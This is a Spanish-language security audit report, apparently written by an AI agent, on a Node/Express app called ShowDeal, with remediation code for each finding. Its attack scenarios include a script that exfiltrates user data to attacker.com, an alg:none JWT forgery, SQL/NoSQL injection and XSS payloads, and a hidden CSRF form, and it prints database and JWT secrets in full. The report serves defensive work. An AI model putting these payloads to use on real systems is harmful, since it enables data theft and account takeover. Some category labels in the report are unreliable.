# 🔒 AUDITORÍA DE SEGURIDAD Y CALIDAD - SHOWDEAL
**Fecha de Auditoría:** Abril 19, 2026  
**Auditor:** QA Specialist Agent  
**Proyecto:** ShowDeal Platform  
**Severidad General:** 🔴 CRÍTICA - Requiere remediación inmediata

---

## 📋 TABLA DE CONTENIDOS

1. [Resumen Ejecutivo](#resumen-ejecutivo)
2. [Vulnerabilidades Críticas](#vulnerabilidades-críticas)
3. [Vulnerabilidades Altas](#vulnerabilidades-altas)
4. [Vulnerabilidades Medias](#vulnerabilidades-medias)
5. [Vulnerabilidades Bajas](#vulnerabilidades-bajas)
6. [Análisis por Categoría OWASP](#análisis-por-categoría-owasp)
7. [Plan de Remediación](#plan-de-remediación)

---

## RESUMEN EJECUTIVO

### 📊 Estadísticas de Vulnerabilidades

| Severidad | Cantidad | Estado |
|-----------|----------|--------|
| 🔴 **CRÍTICA** | 3 | Requiere Fix Inmediato |
| 🟠 **ALTA** | 7 | Requiere Fix Urgente |
| 🟡 **MEDIA** | 5 | Requiere Fix Planificado |
| 🟢 **BAJA** | 3 | Requiere Fix Futuro |
| **TOTAL** | **18** | - |

### ⚠️ Riesgos Principales

**Los riesgos CRÍTICOS son:**
1. **Secrets hardcodeados en .env** - Acceso a BD y JWT secret comprometido
2. **CORS abierto globalmente** - Puede permitir ataques CSRF y exfiltración de datos
3. **Falta validación en endpoints de mutación** - Inyección de datos maliciosos

**If these are NOT fixed, the platform is VULNERABLE TO:**
- Account takeover
- Data exfiltration
- Unauthorized data modification
- Identity spoofing

---

## 🔴 VULNERABILIDADES CRÍTICAS

### 1. SECRETOS HARDCODEADOS EN .ENV (VERSION CONTROL)

**ID:** SEC-CRIT-001  
**Severidad:** 🔴 **CRÍTICA**  
**OWASP:** A02:2021 - Cryptographic Failures  
**Score CVSS:** 9.8 (Critical)

#### Descripción
Las credenciales sensibles están hardcodeadas en el archivo `.env` que probablemente está en version control (Git). Esto expone:
- **DATABASE_URL** con usuario/contraseña PostgreSQL
- **JWT_SECRET** - Secret para firmar tokens JWT
- **JWT_CHALLENGE_SECRET** - Secret para OTP verification

#### 📁 Archivos Afectados
- **[App/.env](App/.env)** - Líneas 1-6

#### 🚨 Código Vulnerable
```env
DATABASE_URL="postgresql://showdeal:b5hpgVj@localhost:5432/showdeal?schema=showdeal"
JWT_SECRET="WA4Xo4x6Y0o0m1pxP3i392OukiE91rgwB8g"
JWT_CHALLENGE_SECRET="JBSWY3DPEHPK3PXP"
```

#### 💥 Impacto
- **Confidentiality:** Comprometida - Cualquiera con acceso al repo puede leer credentials
- **Integrity:** Comprometida - Atacante puede falsificar tokens JWT
- **Availability:** 💥 Atacante puede obtener acceso a la BD

#### ✅ Recomendación
1. **NO versionar .env** - Crear `.env.example` sin valores reales
2. Usar **variable manager** (Vault, AWS Secrets Manager, o similar)
3. Rotar TODOS los secrets inmediatamente:
   - Cambiar contraseña PostgreSQL
   - Generar nuevos JWT_SECRETs
   - Revocar/regenerar OTP tokens activos

#### ✨ Código Seguro
```bash
# .gitignore - Agregar SIEMPRE
.env
.env.local
.env.*.local

# .env.example - Versionar SIN valores
PORT=3001
DATABASE_URL="postgresql://user:password@localhost:5432/dbname?schema=public"
JWT_SECRET="your-secret-here"
JWT_CHALLENGE_SECRET="your-challenge-secret"
```

```javascript
// src/server.js - Validar secrets al iniciar
require("dotenv").config();

const requiredEnvVars = ["DATABASE_URL", "JWT_SECRET", "JWT_CHALLENGE_SECRET"];
const missing = requiredEnvVars.filter(v => !process.env[v]);

if (missing.length > 0) {
  throw new Error(`Missing required environment variables: ${missing.join(", ")}`);
}

if (process.env.JWT_SECRET.length < 32) {
  throw new Error("JWT_SECRET must be at least 32 characters long");
}
```

#### 🔁 Dependencia
- **A2021 - Secrets Management**
- **OWASP - A02:2021**

---

### 2. CORS SIN RESTRICCIONES (OPEN CORS)

**ID:** SEC-CRIT-002  
**Severidad:** 🔴 **CRÍTICA**  
**OWASP:** A01:2021 - Broken Access Control  
**Score CVSS:** 8.6 (Critical)

#### Descripción
CORS está configurado sin restricciones, permitiendo solicitudes desde CUALQUIER origen:

```javascript
app.use(cors());  // ❌ ALLOWS ALL ORIGINS
```

Esto permite:
- **CSRF attacks** - Sitios maliciosos pueden hacer requests a la API
- **Data exfiltration** - Scripts maliciosos pueden leer datos sensibles
- **Session hijacking** - Robo de tokens JWT del localStorage

#### 📁 Archivos Afectados
- **[src/app.js](src/app.js)** - Línea 13

#### 🚨 Código Vulnerable
```javascript
const cors = require("cors");

function createApp() {
  const app = express();
  
  app.use(helmet());
  app.use(cors());  // ❌ NO WHITELIST - ABRE TODAS LAS ORIGENES
  
  // ...
}
```

#### 💥 Impacto - Escenario Real

**Atacante publica sitio malicioso:**
```html
<!-- hacker.com -->
<script>
fetch('http://localhost:3001/api/r_user', {
  credentials: 'include'  // Envía cookies/tokens
}).then(r => r.json()).then(data => {
  // Exfiltra datos a servidor atacante
  fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

#### ✅ Recomendación
1. **Whitelist orígenes permitidos**
2. Validar origen en cada request
3. No permitir `Access-Control-Allow-Credentials` con `*`

#### ✨ Código Seguro
```javascript
const cors = require("cors");

function createApp() {
  const app = express();
  
  const allowedOrigins = [
    "http://localhost:3000",      // Dev
    "http://localhost:3001",      // API Dev
    "https://showdeal.com",       // Prod
    "https://www.showdeal.com",   // Prod www
    "https://app.showdeal.com",   // Prod app subdomain
  ];
  
  app.use(cors({
    origin: (origin, callback) => {
      // Permitir requests sin origin (mobile, curl, etc)
      if (!origin) return callback(null, true);
      
      if (allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error(`CORS policy: ${origin} is not allowed`));
      }
    },
    credentials: true,
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
    maxAge: 86400,  // 24 hours
  }));
  
  app.use(helmet());
  // ... rest
}
```

#### 🔁 Dependencia
- **A01:2021 - Broken Access Control**
- **A03:2021 - Injection** (CSRF like attacks)

---

### 3. FALTA VALIDACIÓN ZOD EN MUTACIONES (NO SCHEMA VALIDATION)

**ID:** SEC-CRIT-003  
**Severidad:** 🔴 **CRÍTICA**  
**OWASP:** A03:2021 - Injection  
**Score CVSS:** 8.2 (High)

#### Descripción
Los endpoints de mutación (POST/PUT) NO validan entrada con Zod schemas. En lugar de eso, usan `sanitizePayload()` que solo valida tipos pero **NO valida reglas de negocio**.

Esto permite:
- Inyección de datos maliciosos
- Inserción de valores fuera de rango
- Bypass de restricciones de dominio

#### 📁 Archivos Afectados
- **[src/routes/crud.factory.js](src/routes/crud.factory.js)** - POST/PUT handlers (líneas 210-250)
- **[src/auth/auth.routes.js](src/auth/auth.routes.js)** - Login endpoint (línea 15)
- **[src/users/user.routes.js](src/users/user.routes.js)** - POST/PUT handlers (líneas 66-87)

#### 🚨 Código Vulnerable - CRUD Factory

```javascript
// ❌ POST route - NO validación de dominio
r.post("/", requireModuleAccess(model, "create"), async (req, res, next) => {
  try {
    const payload = sanitizePayload(model, idField, req.body);  // Solo valida tipo
    const created = await prisma[model].create({
      data: payload,
    });
    
    res.status(201).json({ ok: true, data: jsonSafe(created) });
  } catch (err) {
    next(err);
  }
});

// sanitizePayload() solo verifica tipos, NO reglas de negocio:
function sanitizePayload(model, idField, body) {
  // ...
  const value = coerceFieldValue(field, rawValue);  // Convierte tipo
  // ❌ NO valida: longitud strings, rango números, emails válidos, etc
  if (value !== undefined) payload[key] = value;
}
```

#### 🚨 Código Vulnerable - Auth

```javascript
// ❌ Login WITHOUT validation
router.post("/login", async (req, res, next) => {
  try {
    const { user, password } = req.body || {};  // ❌ NO validado
    const result = await login({ user, password });  // Valida after logic
  }
});

// Mejor: Validar ANTES
```

#### 💥 Impacto - Ataques Posibles

**Ataque 1: Inyección en creación de asset**
```json
POST /api/r_asset
{
  "uin": "ASSET-001",
  "tp_asset": "<img src=x onerror='alert(1)'>",  // XSS via BD
  "status": ""; DROP TABLE r_asset; --",  // SQL injection attempt
  "book_value": "999999999999999"  // Overflow
}
```

**Ataque 2: Bypass de lógica en login**
```json
POST /auth/login
{
  "user": "admin\" OR \"1\"=\"1",  // SQL injection attempt
  "password": {"$ne": null}  // Bypass password check
}
```

#### ✅ Recomendación
1. Crear Zod schemas para TODOS los endpoints
2. Validar entrada SIEMPRE con `.parse()` (throw error) o `.safeParse()` (return error)
3. Incluir validación en auth/login

#### ✨ Código Seguro

```javascript
// Crear schemas.js
const { z } = require("zod");

const userSchema = z.object({
  id_company: z.union([z.string(), z.number()]).transform(Number),
  id_role: z.union([z.string(), z.number()]).transform(Number),
  uin: z.string().trim().min(1).max(50),
  user: z.string().trim().min(3).max(100),
  user_1: z.string().trim().min(3).max(100).optional(),
  name: z.string().trim().min(1).max(255),
  is_active: z.boolean().default(true),
  additional: z.record(z.any()).nullable().optional(),
  password: z.string().min(8).max(128).optional(),
});

const loginSchema = z.object({
  user: z.string().trim().min(1).max(100),
  password: z.string().min(1).max(500),
});

const assetSchema = z.object({
  uin: z.string().trim().min(1).max(255),
  tp_asset: z.string().trim().min(1).max(100),
  status: z.string().trim().min(1).max(50),
  book_value: z.number().min(0).max(999999999.99),
  appraised_value: z.number().min(0).max(999999999.99),
  // ... más campos
});

// USAR en routes
router.post("/login", async (req, res, next) => {
  try {
    // Validar ANTES
    const validated = loginSchema.parse(req.body);
    const result = await login(validated);
    return respondWithResult(res, result);
  } catch (err) {
    if (err instanceof z.ZodError) {
      return res.status(400).json({
        ok: false,
        error: "VALIDATION_ERROR",
        issues: err.issues
      });
    }
    return next(err);
  }
});

// CRUD Factory mejorado
r.post("/", requireModuleAccess(model, "create"), async (req, res, next) => {
  try {
    // Obtener schema del modelo
    const schema = getSchemaForModel(model);  // Necesita ser implementado
    
    // Validar antes de procesar
    const validated = schema.parse(req.body);
    
    const created = await prisma[model].create({
      data: validated,
    });
    
    res.status(201).json({ ok: true, data: jsonSafe(created) });
  } catch (err) {
    if (err instanceof z.ZodError) {
      return res.status(400).json({
        ok: false,
        error: "VALIDATION_ERROR",
        issues: err.issues
      });
    }
    next(err);
  }
});
```

#### 🔁 Dependencia
- **A03:2021 - Injection**
- **A01:2021 - Broken Access Control** (sin validación de campos críticos)

---

## 🟠 VULNERABILIDADES ALTAS

### 4. JWT SIN VERIFICACIÓN DE ALGORITMO (JWT ALGORITHM CONFUSION)

**ID:** SEC-HIGH-001  
**Severidad:** 🟠 **ALTA**  
**OWASP:** A02:2021 - Cryptographic Failures  
**Score CVSS:** 7.5 (High)

#### Descripción
El middleware de JWT no valida explícitamente el algoritmo, permitiendo un "algorithm confusion attack" donde un atacante puede usar `HS256` en lugar de `RS256` o similar.

#### 📁 Archivos Afectados
- **[src/auth/auth.middleware.js](src/auth/auth.middleware.js)** - Línea 23

#### 🚨 Código Vulnerable
```javascript
function requireAuth(req, res, next) {
  try {
    const header = req.headers.authorization || "";
    const [, token] = header.split(" ");
    if (!token) return res.status(401).json({ ok: false, error: "Missing Bearer token" });

    const secret = process.env.JWT_SECRET;
    if (!secret) return res.status(500).json({ ok: false, error: "JWT_SECRET missing" });

    // ❌ NO especifica algoritmo - jwt.verify puede aceptar cualquier algoritmo
    req.auth = jwt.verify(token, secret);
    return next();
  } catch (e) {
    return res.status(401).json({ ok: false, error: "Invalid token" });
  }
}
```

#### 💥 Impacto - Attack Scenario

Un atacante puede crear un token con `alg: "none"`:
```javascript
// Atacante crea token
const payload = {
  sub: "999",  // Admin ID
  login: "admin",
  isAdmin: true
};

// Encode con alg: "none"
const header = btoa(JSON.stringify({alg: "none", typ: "JWT"}));
const body = btoa(JSON.stringify(payload));
const fakToken = `${header}.${body}.`;  // Firma vacía

# Servidor acepta porque NO verifica algoritmo
```

#### ✅ Recomendación
Especificar algoritmo permitido al verificar

#### ✨ Código Seguro
```javascript
const jwt = require("jsonwebtoken");

function requireAuth(req, res, next) {
  try {
    const header = req.headers.authorization || "";
    
    // Validar formato Bearer
    if (!header.startsWith("Bearer ")) {
      return res.status(401).json({ ok: false, error: "Missing Bearer token" });
    }
    
    const token = header.substring(7);  // Remove "Bearer " prefix
    if (!token) return res.status(401).json({ ok: false, error: "Missing token" });

    const secret = process.env.JWT_SECRET;
    if (!secret) return res.status(500).json({ ok: false, error: "JWT_SECRET missing" });

    // ✅ Especificar algoritmo y validar
    req.auth = jwt.verify(token, secret, {
      algorithms: ["HS256"],  // SOLO permitir HS256
      issuer: "showdeal",     // Validar issuer si aplica
      audience: "showdeal-users"  // Validar audience
    });
    
    // Validaciones adicionales
    if (!req.auth.sub) {
      return res.status(401).json({ ok: false, error: "Invalid token: missing sub" });
    }
    
    return next();
  } catch (err) {
    if (err.name === "JsonWebTokenError") {
      return res.status(401).json({ ok: false, error: "Invalid token", detail: err.message });
    }
    return res.status(401).json({ ok: false, error: "Token verification failed" });
  }
}
```

#### 🔁 Dependencia
- **A02:2021 - Cryptographic Failures**
- **Authentication bypass**

---

### 5. OTP SIN RATE LIMITING (BRUTE FORCE ATTACK)

**ID:** SEC-HIGH-002  
**Severidad:** 🟠 **ALTA**  
**OWASP:** A07:2021 - Identification and Authentication Failures  
**Score CVSS:** 7.3 (High)

#### Descripción
El endpoint `/auth/otp/verify` NO tiene protección contra brute force. Un atacante puede intentar todos los valores OTP (000000-999999) en segundos.

#### 📁 Archivos Afectados
- **[src/auth/auth.routes.js](src/auth/auth.routes.js)** - Línea 24
- **[src/auth/auth.service.js](src/auth/auth.service.js)** - Línea 233

#### 🚨 Código Vulnerable
```javascript
// auth.routes.js
router.post("/otp/verify", async (req, res, next) => {  // ❌ NO RATE LIMIT
  try {
    const { challengeToken, otp } = req.body || {};
    const result = await verifyOtp({ challengeToken, otp });
    return respondWithResult(res, result);
  } catch (err) {
    return next(err);
  }
});

// auth.service.js - NO tracking de intentos
async function verifyOtp({ challengeToken, otp }) {
  // ...
  const isValid = authenticator.check(String(otp), otpCfg.secret);
  if (!isValid) return { ok: false, status: 401, error: "Invalid OTP" };  // ❌ Sin penalización
  // ...
}
```

#### 💥 Impacto
- Atacante intenta 1M OTP codes en minutos
- 4-digit OTP: 10,000 intentos = <1 segundo
- 6-digit OTP: 1,000,000 intentos = ~10 segundos

#### ✅ Recomendación
1. Implementar rate limiting por IP/usuario
2. Bloquear después de N intentos fallidos
3. Implementar exponential backoff

#### ✨ Código Seguro

```javascript
// Crear rate limiter para OTP
// npm install express-rate-limit

const rateLimit = require("express-rate-limit");

// Rate limit para OTP: máx 5 intentos por 15 minutos por IP
const otpLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutos
  max: 5,                     // 5 intentos
  message: { ok: false, error: "TOO_MANY_OTP_ATTEMPTS" },
  standardHeaders: true,
  legacyHeaders: false,
  skip: (req) => !req.body?.challengeToken,  // Skip si no hay token
});

router.post("/otp/verify", otpLimiter, async (req, res, next) => {
  try {
    const { challengeToken, otp } = req.body || {};
    const result = await verifyOtp({ challengeToken, otp });
    return respondWithResult(res, result);
  } catch (err) {
    return next(err);
  }
});

// Alternativa: tracking manual (sin librería)
const otpAttempts = new Map();  // { challengeToken: { attempts, lastAttempt, locked } }

async function verifyOtp({ challengeToken, otp }) {
  if (!challengeToken || !otp) {
    return { ok: false, status: 400, error: "challengeToken and otp are required" };
  }

  // Verificar si está bloqueado
  const attempt = otpAttempts.get(challengeToken);
  if (attempt?.locked) {
    const secondsSinceLock = (Date.now() - attempt.lockedAt) / 1000;
    const waitSeconds = 60 * (2 ** attempt.lockCount);  // Exponential backoff
    
    if (secondsSinceLock < waitSeconds) {
      return { 
        ok: false, 
        status: 429,  // Too Many Requests
        error: "TOO_MANY_OTP_ATTEMPTS",
        retryAfter: Math.ceil(waitSeconds - secondsSinceLock)
      };
    }
    
    // Desbloquear después del tiempo
    otpAttempts.delete(challengeToken);
  }

  let payload;
  try {
    payload = verifyChallenge(challengeToken);
  } catch {
    return { ok: false, status: 401, error: "Invalid challengeToken" };
  }

  const u = await findUserById(payload.sub);
  const otpCfg = otpInfo(u.additional);
  const isValid = authenticator.check(String(otp), otpCfg.secret);

  if (!isValid) {
    // Registrar intento fallido
    const current = otpAttempts.get(challengeToken) || { attempts: 0, lockCount: 0 };
    current.attempts++;
    current.lastAttempt = Date.now();
    
    if (current.attempts >= 5) {
      current.locked = true;
      current.lockedAt = Date.now();
      current.lockCount++;
      otpAttempts.set(challengeToken, current);
      
      return { 
        ok: false, 
        status: 429, 
        error: "TOO_MANY_OTP_ATTEMPTS",
        locked: true,
        retryAfter: 60 * (2 ** current.lockCount)
      };
    }
    
    otpAttempts.set(challengeToken, current);
    return { 
      ok: false, 
      status: 401, 
      error: "Invalid OTP",
      attemptsRemaining: 5 - current.attempts 
    };
  }

  // Limpiar intentos en exitoso
  otpAttempts.delete(challengeToken);

  const token = signJwt({ /* ... */ });
  return {
    ok: true,
    status: 200,
    data: { token, user: buildUserPayload(u) },
  };
}
```

#### 🔁 Dependencia
- **A07:2021 - Identification and Authentication Failures**
- **Brute force prevention**

---

### 6. FALTA X-CSRF-TOKEN EN FORMULARIOS

**ID:** SEC-HIGH-003  
**Severidad:** 🟠 **ALTA**  
**OWASP:** A01:2021 - Broken Access Control  
**Score CVSS:** 7.1 (High)

#### Descripción
No hay protección CSRF. Un atacante puede hacer solicitudes mutantes (POST/PUT/DELETE) en nombre del usuario autenticado desde un sitio tercero.

#### 📁 Archivos Afectados
- **[src/app.js](src/app.js)** - Falta middleware CSRF
- **[public/assets/js/crud-module.js](public/assets/js/crud-module.js)** - No incluye CSRF token en requests

#### 🚨 Código Vulnerable - Backend
```javascript
// app.js - ❌ NO hay middleware CSRF
function createApp() {
  const app = express();
  
  app.use(helmet());
  app.use(cors());  // Ya vulnerable
  // ❌ NO app.use(csrf())
  
  app.use(express.json());
}
```

#### 🚨 Código Vulnerable - Frontend
```javascript
// crud-module.js - No valida CSRF token
async function request(path, { method = "GET", body = null, headers = {} } = {}) {
  // ❌ NO verifica x-csrf-token en headers
  const res = await fetch(API_BASE + path, {
    method,
    headers: nextHeaders,
    body: body ? JSON.stringify(body) : null,
  });
}
```

#### 💥 Impacto - Attack Scenario

**Sitio malicioso hace request en nombre del usuario:**
```html
<!-- hacker.com -->
<!-- Usuario autenticado en showdeal.com visita hacker.com -->
<img src="http://showdeal-app:3001/api/r_user" onerror="this.src='http://showdeal-app:3001/api/r_user/1?is_active=false'" />

<!-- O un formulario oculto -->
<form action="http://showdeal-app:3001/api/r_user/1" method="POST" style="display:none">
  <input name="is_active" value="false">
  <input type="submit">
</form>
<script>
  document.querySelector('form').submit();
</script>
```

#### ✅ Recomendación
1. Implementar CSRF token middleware
2. Validar token en todas las mutaciones
3. Usar SameSite cookies

#### ✨ Código Seguro

```bash
# Instalar librería CSRF
npm install csurf cookie-parser
```

```javascript
// app.js
const express = require("express");
const cookieParser = require("cookie-parser");
const csrf = require("csurf");

function createApp() {
  const app = express();

  app.use(helmet());
  app.use(cors({
    origin: allowedOrigins,
    credentials: true,
  }));

  // ✅ Agregar soporte para cookies
  app.use(cookieParser());

  app.use(express.json({ limit: "2mb" }));
  app.use(express.urlencoded({ extended: true }));

  // ✅ CSRF protection
  const csrfProtection = csrf({ 
    cookie: false,  // usar session en lugar de cookie
    value: (req) => req.body._csrf || req.headers["x-csrf-token"]
  });

  // GET endpoints retornan token CSRF
  app.get("/api/csrf-token", csrfProtection, (req, res) => {
    res.json({ csrfToken: req.csrfToken() });
  });

  // ✅ Aplicar CSRF a POST/PUT/DELETE
  app.use("/api/", csrfProtection);

  // LOGIN sin CSRF (solo GET login page)
  app.post("/auth/login", express.json(), csrfProtection, authRouter);

  // ... rest de rutas

  // Error handler para CSRF
  app.use((err, req, res, next) => {
    if (err.code === "EBADCSRFTOKEN") {
      res.status(403).json({ ok: false, error: "INVALID_CSRF_TOKEN" });
    } else {
      next(err);
    }
  });
}
```

```javascript
// Frontend - crud-module.js
async function request(path, { method = "GET", body = null, headers = {} } = {}) {
  // Para mutaciones, obtener token CSRF
  if (["POST", "PUT", "DELETE"].includes(method)) {
    if (!window.__csrfToken) {
      const csrfRes = await fetch("/api/csrf-token");
      const csrfData = await csrfRes.json();
      window.__csrfToken = csrfData.csrfToken;
    }
    
    headers["x-csrf-token"] = window.__csrfToken;
  }

  const nextHeaders = getAuthHeaders(headers);
  
  const res = await fetch(API_BASE + path, {
    method,
    headers: nextHeaders,
    body: body ? JSON.stringify(body) : null,
    credentials: "include",  // Incluir cookies
  });
  
  // Si CSRF token expira, reintentar
  if (res.status === 403 && res.headers.get("x-csrf-error")) {
    window.__csrfToken = null;
    return request(path, { method, body, headers }); // Reintentar
  }
  
  // ... resto del código
}
```

#### 🔁 Dependencia
- **A01:2021 - Broken Access Control**
- **CSRF prevention**

---

### 7. FILE UPLOAD SIN VALIDACIÓN MIME TYPE

**ID:** SEC-HIGH-004  
**Severidad:** 🟠 **ALTA**  
**OWASP:** A04:2021 - Insecure Deserialization  
**Score CVSS:** 6.9 (Medium-High)

#### Descripción
El servicio de upload de archivos (attachment) NO valida el MIME type. Un atacante puede:
- Subir ejecutables (.exe, .php, .sh)
- Inyectar código malicioso disfrazado de imágenes
- Causaroverflow de storage

#### 📁 Archivos Afectados
- **[src/attachments/attachment.routes.js](src/attachments/attachment.routes.js)** - Líneas 30-50
- **[src/attachments/attachment.service.js](src/attachments/attachment.service.js)** - `buildFilePayload()` función

#### 🚨 Código Vulnerable
```javascript
// attachment.routes.js
const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: parseInteger(process.env.ATTACH_MAX_SIZE_BYTES, 10 * 1024 * 1024),
  },
  // ❌ NO especifica mimeTypes permitidos
  // ❌ Multer NO valida by default
});

// attachment.service.js
function buildFilePayload(file) {
  if (!file?.buffer) return null;

  const content = Buffer.isBuffer(file.buffer) ? file.buffer : Buffer.from(file.buffer);
  const fileHash = crypto.createHash("sha256").update(content).digest("hex");

  return {
    file_name: String(file.originalname || "").trim() || null,
    mime_type: String(file.mimetype || "").trim() || "application/octet-stream",
    // ❌ mime_type viene del CLIENTE - puede ser falsificado
    // ❌ NO hay validación del contenido real (magic bytes)
    file_size_bytes: BigInt(content.length),
    file_hash: fileHash,
    file_content: content,
  };
}
```

#### 💥 Impacto - Attack Scenarios

**Ataque 1: Upload de executable con extension falsa**
```
POST /api/r_attach
Content-Disposition: form-data; name="file"; filename="report.pdf"
Content-Type: application/pdf

MZ...  # PE header (Windows executable)
```

**Ataque 2: Upload de PHP backdoor**
```
filename: image.jpg
Content-Type: application/jpg
(pero contiene código PHP)
```

**Ataque 3: Denial of Service**
```
Upload de archivo de 5GB
```

#### ✅ Recomendación
1. Validar MIME type vs contenido real (magic bytes)
2. Whitelist de extensiones permitidas
3. Almacenar con nombre aleatorio
4. Serve con Content-Disposition: attachment

#### ✨ Código Seguro

```bash
# Instalar librerías para validar
npm install file-type mime-types
```

```javascript
// utils/fileValidator.js
const fileType = require("file-type");
const path = require("path");

// Whitelist de tipos permitidos
const ALLOWED_MIME_TYPES = [
  "application/pdf",
  "image/jpeg",
  "image/png",
  "image/gif",
  "image/webp",
  "application/msword",
  "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  "application/vnd.ms-excel",
  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  "application/zip",
  "application/x-zip-compressed",
  "application/x-rar-compressed",
];

const ALLOWED_EXTENSIONS = [
  ".pdf",
  ".jpg", ".jpeg",
  ".png",
  ".gif",
  ".webp",
  ".doc", ".docx",
  ".xls", ".xlsx",
  ".zip",
  ".rar",
];

// Validar magic bytes (contenido real del archivo)
async function validateFile(buffer, originalFilename) {
  // Obtener tipo de archivo real
  const detectedType = await fileType.fromBuffer(buffer);

  if (!detectedType) {
    throw new Error("INVALID_FILE_TYPE - No file type detected");
  }

  // Validar MIME type
  if (!ALLOWED_MIME_TYPES.includes(detectedType.mime)) {
    throw new Error(
      `INVALID_FILE_TYPE - ${detectedType.mime} not allowed`
    );
  }

  // Validar extensión
  const ext = path.extname(originalFilename || "").toLowerCase();
  if (!ALLOWED_EXTENSIONS.includes(ext)) {
    throw new Error(
      `INVALID_FILE_EXTENSION - ${ext} not allowed`
    );
  }

  // Validar que extension coincida con tipo real
  const detectedExt = `.${detectedType.ext}`;
  if (ext !== detectedExt && ext !== ".zip" && detectedType.mime !== "application/zip") {
    console.warn(
      `[SECURITY] File extension mismatch: claim=${ext}, actual=${detectedExt}`
    );
    // Opcionalmente rechazar, o alertar
  }

  return detectedType;
}

module.exports = {
  validateFile,
  ALLOWED_MIME_TYPES,
  ALLOWED_EXTENSIONS,
};
```

```javascript
// attachment.service.js - Mejorado
const { validateFile } = require("../utils/fileValidator");

async function buildFilePayload(file) {
  if (!file?.buffer) return null;

  const content = Buffer.isBuffer(file.buffer) ? file.buffer : Buffer.from(file.buffer);
  
  // ✅ Validar archivo
  const detectedType = await validateFile(
    content,
    file.originalname
  );

  const fileHash = crypto.createHash("sha256").update(content).digest("hex");

  // Generar nombre aleatorio
  const randomName = `${Date.now()}_${crypto.randomBytes(8).toString("hex")}`;
  const extension = detectedType.ext;

  return {
    file_name: String(file.originalname || "unknown").trim(),  // Nombre original para mostrar
    stored_name: `${randomName}.${extension}`,  // Nombre aleatorio para guardar
    mime_type: detectedType.mime,  // Del análisis real, NO del cliente
    file_size_bytes: BigInt(content.length),
    file_hash: fileHash,
    file_content: content,
  };
}

async function createAttachment(input, file) {
  const data = normalizeCreateInput(input);
  
  try {
    const filePayload = await buildFilePayload(file);  // ✅ Await validation
    if (!filePayload) {
      throw new Error("FILE_REQUIRED");
    }

    await ensureAssetExists(data.id_asset);

    const duplicate = await findByAssetAndHash(
      data.id_asset,
      filePayload.file_hash
    );
    if (duplicate) {
      if (duplicate.is_active === false) {
        const restored = await prisma.r_attach.update({
          where: { id_attach: duplicate.id_attach },
          data: {
            id_asset: data.id_asset,
            tp_attach: data.tp_attach,
            is_active: data.is_active,
            additional: data.additional,
            ...filePayload,
          },
          include: relationSelect(),
        });
        return serializeAttachment(restored);
      }
      throw new Error("ATTACHMENT_ALREADY_EXISTS");
    }

    const created = await prisma.r_attach.create({
      data: {
        id_asset: data.id_asset,
        tp_attach: data.tp_attach,
        is_active: data.is_active,
        additional: data.additional,
        ...filePayload,
      },
      include: relationSelect(),
    });

    return serializeAttachment(created);
  } catch (err) {
    const error = new Error(err.message || "FILE_UPLOAD_FAILED");
    error.status = 400;
    throw error;
  }
}
```

```javascript
// attachment.routes.js - Mejorado
const multer = require("multer");

const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: parseInteger(process.env.ATTACH_MAX_SIZE_BYTES, 10 * 1024 * 1024, {
      min: 1024,
      max: 50 * 1024 * 1024,
    }),
  },
  // ✅ Filtro de archivos
  fileFilter: (req, file, cb) => {
    // Aquí ya se valida en buildFilePayload, pero podemos hacer check rápido
    const ext = path.extname(file.originalname).toLowerCase();
    if (!ALLOWED_EXTENSIONS.includes(ext)) {
      cb(new Error(`File extension ${ext} not allowed`));
    } else {
      cb(null, true);
    }
  },
});

// Middleware mejorado
function handleSingleUpload(req, res, next) {
  upload.single("file")(req, res, (err) => {
    if (!err) return next();

    if (err.code === "LIMIT_FILE_SIZE") {
      err.status = 400;
      err.message = "FILE_TOO_LARGE";
    } else if (err.message.includes("not allowed")) {
      err.status = 400;
      err.message = "INVALID_FILE_TYPE";
    } else {
      err.status = err.status || 400;
    }

    return next(err);
  });
}

router.post(
  "/",
  requireModuleAccess("r_attach", "create"),
  handleSingleUpload,
  async (req, res, next) => {
    try {
      const data = await createAttachment(req.body || {}, req.file);
      return res.status(201).json(jsonSafe({ ok: true, data }));
    } catch (err) {
      return next(err);  // Captura errores de validación
    }
  }
);
```

#### 🔁 Dependencia
- **A04:2021 - Insecure Deserialization**
- **A06:2021 - Vulnerable and Outdated Components**

---

### 8. N+1 QUERIES EN USER SERVICE

**ID:** SEC-HIGH-005  
**Severidad:** 🟠 **ALTA**  
**OWASP:** A04:2021 - Insecure Deserialization (Performance DoS)  
**Score CVSS:** 6.5 (Medium)

#### Descripción
El servicio de usuarios hace queries adicionales por cada usuario listado. Con 1000 usuarios = 1000+ queries.

#### 📁 Archivos Afectados
- **[src/users/user.service.js](src/users/user.service.js)** - Función `listUsers()` (línea ~80)
- **[src/auth/auth.service.js](src/auth/auth.service.js)** - Función `findUserById()` (línea ~112)

#### 🚨 Código Vulnerable
```javascript
// user.service.js
async function listUsers({ take = 50, skip = 0, ... } = {}) {
  const [rows, total] = await Promise.all([
    prisma.r_user.findMany({
      where: buildWhere(...),
      take,
      skip,
      orderBy: { id_user: "desc" },
      // ❌ INCLUDE de relations generado N+1
      include: {
        r_company: true,    // Query adicional por cada user
        r_role: true,       // Query adicional por cada user
      },
    }),
    // ...
  ]);

  // ❌ Peor: buildUserLabelMaps hace queries adicionales DESPUES
  const maps = await buildUserLabelMaps(rows);  // +2 queries
  
  return {
    rows: rows.map(u => serializeUser(u, maps)),
  };
}

// buildUserLabelMaps - Hace queries separadas
async function buildUserLabelMaps(rows) {
  const companyIds = Array.from(new Set(...));
  const roleIds = Array.from(new Set(...));

  const [companies, roles] = await Promise.all([
    // ❌ Query adicional por empresas
    prisma.r_company.findMany({
      where: { id_company: { in: companyIds } },
    }),
    // ❌ Query adicional por roles
    prisma.r_role.findMany({
      where: { id_role: { in: roleIds } },
    }),
  ]);
}
```

#### 💥 Impacto - Performance DoS
- Lista 50 users = 50 queries (con includes)
- Lista 100 users = 100 queries + overhead
- Timeouts en frontend
- CPU/DB spikes
- Servidor se vuelve lento para todos

#### ✅ Recomendación
1. Usar `select` en lugar de `include` para relaciones
